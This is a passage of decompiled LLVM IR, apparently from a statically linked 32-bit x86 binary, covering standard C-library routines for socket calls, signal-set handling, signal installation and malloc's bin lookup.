  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804fb77 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fb7e = call i32 @__socketcall(i32 14, i32 %v2_804fb77)
  ret i32 %v2_804fb7e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fba3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fbaa = call i32 @__socketcall(i32 1, i32 %v2_804fba3)
  ret i32 %v2_804fbaa

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_804fbcc, label %dec_label_pc_804fbbf

dec_label_pc_804fbbf:                             ; preds = %entry
  %v1_804fbbf = add i32 %arg1, -64
  %v3_804fbbf = sub i32 63, %arg1
  %v4_804fbbf = and i32 %v3_804fbbf, %arg1
  %v5_804fbbf = icmp slt i32 %v4_804fbbf, 0
  %v6_804fbbf = icmp eq i32 %v1_804fbbf, 0
  %v7_804fbbf = icmp slt i32 %v1_804fbbf, 0
  %v3_804fbc2 = icmp eq i1 %v7_804fbbf, %v5_804fbbf
  %v4_804fbc2 = icmp eq i1 %v6_804fbbf, false
  %v5_804fbc2 = and i1 %v4_804fbc2, %v3_804fbc2
  br i1 %v5_804fbc2, label %dec_label_pc_804fbcc, label %dec_label_pc_804fbc4

dec_label_pc_804fbc4:                             ; preds = %dec_label_pc_804fbbf
  %v4_804fbc7 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804fbcc

dec_label_pc_804fbcc:                             ; preds = %dec_label_pc_804fbbf, %entry, %dec_label_pc_804fbc4
  %v1_804fbcc = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804fbd1 = inttoptr i32 %v1_804fbcc to i32*
  store i32 22, i32* %v1_804fbd1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804fbbf, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804fbcc, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804fbee = inttoptr i32 %arg1 to i8*
  %v4_804fbee = call i32 @__GI_memset(i8* %v3_804fbee, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804fbfc = load i32, i32* @ebx, align 4
  %v15_804fbfd = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804fc11 = icmp eq i32 %arg2, -1
  br i1 %v10_804fc11, label %dec_label_pc_804fc1f, label %dec_label_pc_804fc16

dec_label_pc_804fc16:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804fc1f, label %dec_label_pc_804fc1a

dec_label_pc_804fc1a:                             ; preds = %dec_label_pc_804fc16
  %v7_804fc1d = icmp sgt i32 %arg1, 64
  br i1 %v7_804fc1d, label %dec_label_pc_804fc1f, label %dec_label_pc_804fc2c

dec_label_pc_804fc1f:                             ; preds = %dec_label_pc_804fc1a, %dec_label_pc_804fc16, %entry
  %v1_804fc1f = call i32 @__errno_location(i32 %v0_804fbfc)
  store i32 %v1_804fc1f, i32* %eax.global-to-local, align 4
  %v1_804fc24 = inttoptr i32 %v1_804fc1f to i32*
  store i32 22, i32* %v1_804fc24, align 4
  br label %dec_label_pc_804fca0

dec_label_pc_804fc2c:                             ; preds = %dec_label_pc_804fc1a
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fc3a

dec_label_pc_804fc3a:                             ; preds = %dec_label_pc_804fc3a.dec_label_pc_804fc3a_crit_edge, %dec_label_pc_804fc2c
  %v0_804fc3a = phi i32 [ %v15_804fbfd, %dec_label_pc_804fc2c ], [ %v0_804fc3a.pre, %dec_label_pc_804fc3a.dec_label_pc_804fc3a_crit_edge ]
  %v1_804fc4517 = phi i32 [ 31, %dec_label_pc_804fc2c ], [ %v1_804fc45, %dec_label_pc_804fc3a.dec_label_pc_804fc3a_crit_edge ]
  %v2_804fc3a = mul i32 %v1_804fc4517, 4
  %v3_804fc3a = add i32 %v2_804fc3a, 160
  %v4_804fc3a = add i32 %v3_804fc3a, %v0_804fc3a
  %v5_804fc3a = inttoptr i32 %v4_804fc3a to i32*
  store i32 0, i32* %v5_804fc3a, align 4
  %v0_804fc45.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc45 = add i32 %v0_804fc45.pre, -1
  %v9_804fc45 = icmp slt i32 %v1_804fc45, 0
  store i32 %v1_804fc45, i32* %eax.global-to-local, align 4
  %v1_804fc46 = icmp eq i1 %v9_804fc45, false
  br i1 %v1_804fc46, label %dec_label_pc_804fc3a.dec_label_pc_804fc3a_crit_edge, label %dec_label_pc_804fc48

dec_label_pc_804fc3a.dec_label_pc_804fc3a_crit_edge: ; preds = %dec_label_pc_804fc3a
  %v0_804fc3a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fc3a

dec_label_pc_804fc48:                             ; preds = %dec_label_pc_804fc3a
  %v0_804fc48 = load i32, i32* @edx, align 4
  %v2_804fc4b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804fc4b, i32* %eax.global-to-local, align 4
  %v4_804fc53 = call i32 @__sigaddset(i32 %v2_804fc4b, i32 %arg1, i32 %v0_804fc48, i32 %v0_804fc48)
  store i32 %v4_804fc53, i32* %eax.global-to-local, align 4
  %v2_804fc5b = icmp slt i32 %v4_804fc53, 0
  br i1 %v2_804fc5b, label %dec_label_pc_804fca0, label %dec_label_pc_804fc5f

dec_label_pc_804fc5f:                             ; preds = %dec_label_pc_804fc48
  %v4_804fc67 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_805fda0.223 to i32), i32 %arg1, i32 %v4_804fc53, i32 %v4_804fc53)
  %v2_804fc80 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804fc85 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804fc85, i32* %eax.global-to-local, align 4
  %v4_804fc8e = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804fc80)
  store i32 %v4_804fc8e, i32* %eax.global-to-local, align 4
  %v2_804fc96 = icmp slt i32 %v4_804fc8e, 0
  br i1 %v2_804fc96, label %dec_label_pc_804fca0, label %dec_label_pc_804fc9a

dec_label_pc_804fc9a:                             ; preds = %dec_label_pc_804fc5f
  %v3_804fc9a = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804fca3

dec_label_pc_804fca0:                             ; preds = %dec_label_pc_804fc5f, %dec_label_pc_804fc48, %dec_label_pc_804fc1f
  br label %dec_label_pc_804fca3

dec_label_pc_804fca3:                             ; preds = %dec_label_pc_804fc9a, %dec_label_pc_804fca0
  %storemerge = phi i32 [ -1, %dec_label_pc_804fca0 ], [ %v3_804fc9a, %dec_label_pc_804fc9a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804fbfc, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804fc45, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 4, 1, 3, 0, 5 }
  uselistorder label %dec_label_pc_804fca3, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fcba = add i32 %arg2, -1
  %v1_804fcbd = urem i32 %v1_804fcba, 32
  %v2_804fcbd = icmp eq i32 %v1_804fcbd, 0
  %v2_804fcc0 = udiv i32 %v1_804fcba, 32
  br i1 %v2_804fcbd, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804fcc3 = shl i32 1, %v1_804fcbd
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fcc5 = phi i32 [ 1, %entry ], [ %v5_804fcc3, %bb ]
  %v2_804fcc5 = mul nuw nsw i32 %v2_804fcc0, 4
  %v3_804fcc5 = add i32 %v2_804fcc5, %arg1
  %v4_804fcc5 = inttoptr i32 %v3_804fcc5 to i32*
  %v5_804fcc5 = load i32, i32* %v4_804fcc5, align 4
  %v7_804fcc5 = and i32 %v5_804fcc5, %v6_804fcc5
  %v8_804fcc5 = icmp eq i32 %v7_804fcc5, 0
  %v1_804fcc9 = icmp eq i1 %v8_804fcc5, false
  %v2_804fcc9 = zext i1 %v1_804fcc9 to i32
  ret i32 %v2_804fcc9

; uselistorder directives
  uselistorder i32 %v1_804fcbd, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804fcd0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fcd0, i32* %stack_var_-4, align 4
  %v1_804fcde = add i32 %arg2, -1
  %v1_804fce1 = urem i32 %v1_804fcde, 32
  %v2_804fce1 = icmp eq i32 %v1_804fce1, 0
  store i32 %v1_804fce1, i32* @ecx, align 4
  %v2_804fce4 = udiv i32 %v1_804fcde, 32
  store i32 %v2_804fce4, i32* @edx, align 4
  br i1 %v2_804fce1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804fce7 = shl i32 1, %v1_804fce1
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fce9 = phi i32 [ 1, %entry ], [ %v5_804fce7, %bb ]
  %v2_804fce9 = mul nuw nsw i32 %v2_804fce4, 4
  %v3_804fce9 = add i32 %v2_804fce9, %arg1
  %v4_804fce9 = inttoptr i32 %v3_804fce9 to i32*
  %v5_804fce9 = load i32, i32* %v4_804fce9, align 4
  %v7_804fce9 = or i32 %v5_804fce9, %v6_804fce9
  store i32 %v7_804fce9, i32* %v4_804fce9, align 4
  %v2_804fcee = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fcee, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804fce4, { 1, 0 }
  uselistorder i32 %v1_804fce1, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804fcfe = add i32 %arg2, -1
  %v1_804fd01 = urem i32 %v1_804fcfe, 32
  %v2_804fd01 = icmp eq i32 %v1_804fd01, 0
  %v2_804fd04 = udiv i32 %v1_804fcfe, 32
  br i1 %v2_804fd01, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_804fd07 = shl i32 -2, %v1_804fd01
  %v5_804fd07 = sub nsw i32 32, %v1_804fd01
  %v6_804fd07 = lshr i32 -2, %v5_804fd07
  %v7_804fd07 = or i32 %v6_804fd07, %v4_804fd07
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fd09 = phi i32 [ -2, %entry ], [ %v7_804fd07, %bb ]
  %v2_804fd09 = mul nuw nsw i32 %v2_804fd04, 4
  %v3_804fd09 = add i32 %v2_804fd09, %arg1
  %v4_804fd09 = inttoptr i32 %v3_804fd09 to i32*
  %v5_804fd09 = load i32, i32* %v4_804fd09, align 4
  %v7_804fd09 = and i32 %v5_804fd09, %v6_804fd09
  store i32 %v7_804fd09, i32* %v4_804fd09, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804fd01, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804fd10 = load i32, i32* @eax, align 4
  %v6_804fd23 = icmp ugt i32 %v0_804fd10, 16777215
  br i1 %v6_804fd23, label %dec_label_pc_804fd34, label %dec_label_pc_804fd25

dec_label_pc_804fd25:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804fd10, 256
  %v2_804fd13 = udiv i32 %v0_804fd10, 256
  %v2_804fd25 = call i32 @llvm.ctlz.i32(i32 %v2_804fd13, i1 true)
  %v3_804fd25 = xor i32 %v2_804fd25, 31
  %v5_804fd25 = select i1 %tmp, i32 95, i32 %v3_804fd25
  %v1_804fd28 = add nuw nsw i32 %v5_804fd25, 6
  store i32 %v1_804fd28, i32* @ecx, align 4
  %v2_804fd2b = urem i32 %v1_804fd28, 32
  %v4_804fd2b = icmp eq i32 %v2_804fd2b, 0
  br i1 %v4_804fd2b, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804fd25
  %v5_804fd2b = lshr i32 %v0_804fd10, %v2_804fd2b
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804fd25, %bb
  %v0_804fd2d = phi i32 [ %v0_804fd10, %dec_label_pc_804fd25 ], [ %v5_804fd2b, %bb ]
  %v1_804fd2d = urem i32 %v0_804fd2d, 4
  %v2_804fd30 = mul nuw nsw i32 %v5_804fd25, 4
  %v3_804fd30 = or i32 %v1_804fd2d, 32
  %v4_804fd30 = add nuw nsw i32 %v3_804fd30, %v2_804fd30
  br label %dec_label_pc_804fd34

dec_label_pc_804fd34:                             ; preds = %entry, %bb4
  %v0_804fd35 = phi i32 [ 95, %entry ], [ %v4_804fd30, %bb4 ]
  ret i32 %v0_804fd35

; uselistorder directives
  uselistorder i32 %v2_804fd2b, { 1, 0 }
  uselistorder i32 %v0_804fd10, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804fd34, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fd36 = load i32, i32* @ebp, align 4
  %v0_804fd37 = load i32, i32* @edi, align 4
  %v0_804fd38 = load i32, i32* @esi, align 4
  %v0_804fd39 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd39, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fd4b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fd4b, i32* @eax, align 4
  store i32 %v2_804fd4b, i32* %stack_var_-92, align 4
  %v2_804fd50 = call i32 @__pthread_return_void(i32 %v2_804fd4b, i32 134550975)
  store i32 %v2_804fd50, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80599b0.224 to i32), i32* %stack_var_-92, align 4
  %v1_804fd5c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599b0.224 to i32))
  store i32 %v1_804fd5c, i32* %eax.global-to-local, align 4
  %v0_804fd64 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804fd64, -32
  br i1 %tmp125, label %dec_label_pc_804fd7b, label %dec_label_pc_804fd69

dec_label_pc_804fd69:                             ; preds = %entry
  %v0_804fd69 = load i32, i32* %stack_var_-92, align 4
  %v1_804fd69 = call i32 @__errno_location(i32 %v0_804fd69)
  store i32 %v1_804fd69, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804fd70 = inttoptr i32 %v1_804fd69 to i32*
  store i32 12, i32* %v1_804fd70, align 4
  br label %dec_label_pc_80504a0

dec_label_pc_804fd7b:                             ; preds = %entry
  %v1_804fd7b = add i32 %v0_804fd64, 11
  %tmp126 = icmp ult i32 %v1_804fd7b, 16
  br i1 %tmp126, label %dec_label_pc_804fd92, label %dec_label_pc_804fd8b

dec_label_pc_804fd8b:                             ; preds = %dec_label_pc_804fd7b
  %v1_804fd8b = and i32 %v1_804fd7b, -8
  br label %dec_label_pc_804fd92

dec_label_pc_804fd92:                             ; preds = %dec_label_pc_804fd7b, %dec_label_pc_804fd8b
  %storemerge136 = phi i32 [ %v1_804fd8b, %dec_label_pc_804fd8b ], [ %v1_804fd7b, %dec_label_pc_804fd7b ]
  %v1_805012a = phi i32 [ %v1_804fd8b, %dec_label_pc_804fd8b ], [ 16, %dec_label_pc_804fd7b ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804fd92 = load i8, i8* @global_var_805fe20.225, align 1
  %v1_804fd92 = sext i8 %v0_804fd92 to i32
  store i32 %v1_804fd92, i32* @ebx, align 4
  %v3_804fd98 = urem i8 %v0_804fd92, 2
  %v4_804fd98 = icmp eq i8 %v3_804fd98, 0
  %v1_804fd9b = icmp eq i1 %v4_804fd98, false
  br i1 %v1_804fd9b, label %dec_label_pc_804fdba, label %dec_label_pc_804fd9d

dec_label_pc_804fd9d:                             ; preds = %dec_label_pc_804fd92
  %v2_804fd9d = icmp eq i8 %v0_804fd92, 0
  %v1_804fd9f = icmp eq i1 %v2_804fd9d, false
  br i1 %v1_804fd9f, label %dec_label_pc_8050095, label %dec_label_pc_804fda5

dec_label_pc_804fda5:                             ; preds = %dec_label_pc_804fd9d
  store i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32* %stack_var_-92, align 4
  %v2_804fdad = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805fe20.225 to i32*))
  store i32 %v2_804fdad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050095

dec_label_pc_804fdba:                             ; preds = %dec_label_pc_804fd92
  %v11_804fdba = trunc i32 %v1_805012a to i8
  %v8_804fdbe = icmp ugt i8 %v11_804fdba, %v0_804fd92
  br i1 %v8_804fdbe, label %dec_label_pc_804fddb, label %dec_label_pc_804fdc0

dec_label_pc_804fdc0:                             ; preds = %dec_label_pc_804fdba
  %v2_804fdc4 = udiv i32 %v1_805012a, 2
  store i32 %v2_804fdc4, i32* %eax.global-to-local, align 4
  %v1_804fdc6 = add i32 %v2_804fdc4, ptrtoint (i8* @global_var_805fe20.225 to i32)
  store i32 %v1_804fdc6, i32* @ecx, align 4
  %v1_804fdcc = add i32 %v2_804fdc4, add (i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32 -4)
  %v2_804fdcc = inttoptr i32 %v1_804fdcc to i32*
  %v3_804fdcc = load i32, i32* %v2_804fdcc, align 4
  store i32 %v3_804fdcc, i32* @edx, align 4
  %v1_804fdcf = icmp eq i32 %v3_804fdcc, 0
  br i1 %v1_804fdcf, label %dec_label_pc_804fddb, label %dec_label_pc_804fdd3

dec_label_pc_804fdd3:                             ; preds = %dec_label_pc_804fdc0
  %v1_804fdd3 = add i32 %v3_804fdcc, 8
  %v2_804fdd3 = inttoptr i32 %v1_804fdd3 to i32*
  %v3_804fdd3 = load i32, i32* %v2_804fdd3, align 4
  store i32 %v3_804fdd3, i32* %eax.global-to-local, align 4
  store i32 %v3_804fdd3, i32* %v2_804fdcc, align 4
  br label %dec_label_pc_804fe14

dec_label_pc_804fddb:                             ; preds = %dec_label_pc_804fdc0, %dec_label_pc_804fdba
  %v8_804fddb = icmp ult i32 %v1_805012a, 255
  %v6_804fde3 = icmp ugt i32 %v1_805012a, 255
  store i32 %v1_805012a, i32* @eax, align 4
  br i1 %v6_804fde3, label %dec_label_pc_804fe1c, label %dec_label_pc_804fde5

dec_label_pc_804fde5:                             ; preds = %dec_label_pc_804fddb
  %v2_804fde9 = udiv i32 %v1_805012a, 8
  store i32 %v2_804fde9, i32* %eax.global-to-local, align 4
  %v1_804fdf0 = mul nuw i32 %v2_804fde9, 8
  %v2_804fdf0 = add i32 %v1_804fdf0, ptrtoint (i32* @global_var_805fe4c.226 to i32)
  store i32 %v2_804fdf0, i32* @ecx, align 4
  %v1_804fdf7 = add i32 %v1_804fdf0, add (i32 ptrtoint (i32* @global_var_805fe4c.226 to i32), i32 12)
  %v2_804fdf7 = inttoptr i32 %v1_804fdf7 to i32*
  %v3_804fdf7 = load i32, i32* %v2_804fdf7, align 4
  store i32 %v3_804fdf7, i32* @edx, align 4
  %v12_804fdfa = icmp eq i32 %v3_804fdf7, %v2_804fdf0
  br i1 %v12_804fdfa, label %dec_label_pc_804ff18.preheader, label %dec_label_pc_804fe02

dec_label_pc_804fe02:                             ; preds = %dec_label_pc_804fde5
  store i32 %v1_805012a, i32* %ebx.global-to-local, align 4
  %v1_804fe06 = add i32 %v3_804fdf7, 12
  %v2_804fe06 = inttoptr i32 %v1_804fe06 to i32*
  %v3_804fe06 = load i32, i32* %v2_804fe06, align 4
  store i32 %v3_804fe06, i32* %eax.global-to-local, align 4
  store i32 %v3_804fe06, i32* %v2_804fdf7, align 4
  %v0_804fe0c = load i32, i32* @edx, align 4
  %v1_804fe0c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fe0c = add i32 %v0_804fe0c, 4
  %v3_804fe0c = add i32 %v2_804fe0c, %v1_804fe0c
  %v4_804fe0c = inttoptr i32 %v3_804fe0c to i32*
  %v5_804fe0c = load i32, i32* %v4_804fe0c, align 4
  %v6_804fe0c = or i32 %v5_804fe0c, 1
  store i32 %v6_804fe0c, i32* %v4_804fe0c, align 4
  %v0_804fe11 = load i32, i32* @ecx, align 4
  %v1_804fe11 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fe11 = add i32 %v1_804fe11, 8
  %v3_804fe11 = inttoptr i32 %v2_804fe11 to i32*
  store i32 %v0_804fe11, i32* %v3_804fe11, align 4
  br label %dec_label_pc_804fe14

dec_label_pc_804fe14:                             ; preds = %dec_label_pc_80501b1, %dec_label_pc_80501c3, %dec_label_pc_804fdd3, %dec_label_pc_804fe02
  %v0_804fe14 = load i32, i32* @edx, align 4
  %v1_804fe14 = add i32 %v0_804fe14, 8
  store i32 %v1_804fe14, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805048f

dec_label_pc_804fe1c:                             ; preds = %dec_label_pc_804fddb
  %v0_804fe20 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fe20, i32* %eax.global-to-local, align 4
  %v3_804fe25 = and i8 %v0_804fd92, 2
  %v4_804fe25 = icmp eq i8 %v3_804fe25, 0
  %v6_804fe25 = zext i8 %v3_804fe25 to i32
  %v9_804fe25 = and i32 %v1_804fd92, -256
  %v10_804fe25 = or i32 %v9_804fe25, %v6_804fe25
  store i32 %v10_804fe25, i32* @ebx, align 4
  br i1 %v4_804fe25, label %dec_label_pc_804ff18.preheader, label %dec_label_pc_804fe32

dec_label_pc_804fe32:                             ; preds = %dec_label_pc_804fe1c
  store i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32* %stack_var_-92, align 4
  %v2_804fe3a = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805fe20.225 to i32*))
  store i32 %v2_804fe3a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff18.preheader

dec_label_pc_804ff18.preheader:                   ; preds = %dec_label_pc_804fe32, %dec_label_pc_804fde5, %dec_label_pc_804fe1c
  %stack_var_-40.0.ph = phi i32 [ %v2_804fde9, %dec_label_pc_804fde5 ], [ %v0_804fe20, %dec_label_pc_804fe32 ], [ %v0_804fe20, %dec_label_pc_804fe1c ]
  %v1_804fe6e = add i32 %v1_805012a, 16
  %v0_804ff18107 = load i32, i32* @global_var_805fe60.229, align 32
  store i32 %v0_804ff18107, i32* @ebp, align 4
  %v9_804ff1e109 = icmp eq i32 %v0_804ff18107, 134610516
  %v1_804ff24110 = icmp eq i1 %v9_804ff1e109, false
  br i1 %v1_804ff24110, label %dec_label_pc_804fe47, label %dec_label_pc_804ff2a

dec_label_pc_804fe47:                             ; preds = %dec_label_pc_804ff18.preheader, %bb84
  %v0_804ff18111 = phi i32 [ %v0_804ff18, %bb84 ], [ %v0_804ff18107, %dec_label_pc_804ff18.preheader ]
  %v1_804fe47 = add i32 %v0_804ff18111, 4
  %v2_804fe47 = inttoptr i32 %v1_804fe47 to i32*
  %v3_804fe47 = load i32, i32* %v2_804fe47, align 4
  %v1_804fe4a = add i32 %v0_804ff18111, 12
  %v2_804fe4a = inttoptr i32 %v1_804fe4a to i32*
  %v3_804fe4a = load i32, i32* %v2_804fe4a, align 4
  store i32 %v3_804fe4a, i32* @edx, align 4
  %v1_804fe4d = and i32 %v3_804fe47, -4
  store i32 %v1_804fe4d, i32* @edi, align 4
  br i1 %v6_804fde3, label %dec_label_pc_804fe79, label %dec_label_pc_804fe5a

dec_label_pc_804fe5a:                             ; preds = %dec_label_pc_804fe47
  %v9_804fe5a = icmp eq i32 %v3_804fe4a, 134610516
  %v1_804fe60 = icmp eq i1 %v9_804fe5a, false
  br i1 %v1_804fe60, label %dec_label_pc_804fe79, label %dec_label_pc_804fe62

dec_label_pc_804fe62:                             ; preds = %dec_label_pc_804fe5a
  %v1_804fe62 = load i32, i32* @global_var_805fe50.227, align 16
  %v12_804fe62 = icmp eq i32 %v0_804ff18111, %v1_804fe62
  %v1_804fe68 = icmp eq i1 %v12_804fe62, false
  br i1 %v1_804fe68, label %dec_label_pc_804fe79, label %dec_label_pc_804fe6a

dec_label_pc_804fe6a:                             ; preds = %dec_label_pc_804fe62
  store i32 %v1_804fe6e, i32* %eax.global-to-local, align 4
  %v6_804fe73 = icmp ugt i32 %v1_804fe4d, %v1_804fe6e
  br i1 %v6_804fe73, label %dec_label_pc_805042a, label %dec_label_pc_804fe79

dec_label_pc_804fe79:                             ; preds = %dec_label_pc_804fe6a, %dec_label_pc_804fe62, %dec_label_pc_804fe5a, %dec_label_pc_804fe47
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %eax.global-to-local, align 4
  %v2_804fe7e = add i32 %v3_804fe4a, 8
  %v3_804fe7e = inttoptr i32 %v2_804fe7e to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v3_804fe7e, align 4
  %v0_804fe81 = load i32, i32* @edx, align 4
  store i32 %v0_804fe81, i32* @global_var_805fe60.229, align 4
  %v0_804fe84 = load i32, i32* @edi, align 4
  %v15_804fe84 = icmp eq i32 %v0_804fe84, %v1_805012a
  br i1 %v15_804fe84, label %dec_label_pc_805046b, label %dec_label_pc_804fe8e

dec_label_pc_804fe8e:                             ; preds = %dec_label_pc_804fe79
  %v6_804fe94 = icmp ugt i32 %v0_804fe84, 255
  br i1 %v6_804fe94, label %dec_label_pc_804fea7, label %dec_label_pc_804fe96

dec_label_pc_804fe96:                             ; preds = %dec_label_pc_804fe8e
  %v2_804fe98 = udiv i32 %v0_804fe84, 8
  store i32 %v2_804fe98, i32* %esi.global-to-local, align 4
  %v1_804fe9b = mul nuw i32 %v2_804fe98, 8
  %v2_804fe9b = add i32 %v1_804fe9b, 134610508
  store i32 %v2_804fe9b, i32* @ebx, align 4
  %v1_804fea2 = add i32 %v1_804fe9b, 134610516
  %v2_804fea2 = inttoptr i32 %v1_804fea2 to i32*
  %v3_804fea2 = load i32, i32* %v2_804fea2, align 4
  store i32 %v3_804fea2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fef0

dec_label_pc_804fea7:                             ; preds = %dec_label_pc_804fe8e
  store i32 %v0_804fe84, i32* @eax, align 4
  %v0_804fea9 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fea9, i32* %esi.global-to-local, align 4
  %v1_804feb0 = mul i32 %v0_804fea9, 8
  %v2_804feb0 = add i32 %v1_804feb0, ptrtoint (i32* @global_var_805fe4c.226 to i32)
  store i32 %v2_804feb0, i32* %eax.global-to-local, align 4
  %v1_804feb7 = add i32 %v1_804feb0, add (i32 ptrtoint (i32* @global_var_805fe4c.226 to i32), i32 8)
  %v2_804feb7 = inttoptr i32 %v1_804feb7 to i32*
  %v3_804feb7 = load i32, i32* %v2_804feb7, align 4
  store i32 %v3_804feb7, i32* %edx.global-to-local, align 4
  store i32 %v3_804feb7, i32* @ebx, align 4
  %v12_804fec0 = icmp eq i32 %v3_804feb7, %v2_804feb0
  br i1 %v12_804fec0, label %dec_label_pc_804fef0, label %dec_label_pc_804fec4

dec_label_pc_804fec4:                             ; preds = %dec_label_pc_804fea7
  %v1_804fec4 = add i32 %v1_804feb0, add (i32 ptrtoint (i32* @global_var_805fe4c.226 to i32), i32 12)
  %v2_804fec4 = inttoptr i32 %v1_804fec4 to i32*
  %v3_804fec4 = load i32, i32* %v2_804fec4, align 4
  store i32 %v3_804fec4, i32* @ebx, align 4
  %v0_804fec7 = load i32, i32* @edi, align 4
  %v2_804fec7 = add i32 %v3_804fec4, 4
  %v3_804fec7 = inttoptr i32 %v2_804fec7 to i32*
  %v4_804fec7 = load i32, i32* %v3_804fec7, align 4
  %v10_804fec7 = icmp ult i32 %v0_804fec7, %v4_804fec7
  %v1_804feca = icmp eq i1 %v10_804fec7, false
  br i1 %v1_804feca, label %dec_label_pc_804fed2, label %dec_label_pc_804fef0

